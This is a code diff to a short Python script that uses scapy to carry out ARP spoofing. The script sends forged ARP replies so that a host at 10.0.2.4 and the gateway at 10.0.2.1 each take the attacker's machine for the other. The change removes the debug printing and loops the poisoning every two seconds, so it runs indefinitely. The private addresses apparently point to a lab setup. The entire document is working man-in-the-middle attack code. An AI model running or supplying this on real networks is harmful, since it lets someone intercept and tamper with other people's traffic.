@@ -2,6 +2,7 @@
 
 import scapy.layers.l2 as l2
 import scapy.all as scapy
+import time
 
 
 def get_mac(ip):
@@ -15,10 +16,10 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = l2.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    print(packet.show())
-    print(packet.summary())
     scapy.send(packet)
 
 
-spoof("10.0.2.4", "10.0.2.1")
-spoof("10.0.2.1", "10.0.2.4")
+while True:
+    spoof("10.0.2.4", "10.0.2.1")
+    spoof("10.0.2.1", "10.0.2.4")
+    time.sleep(2)
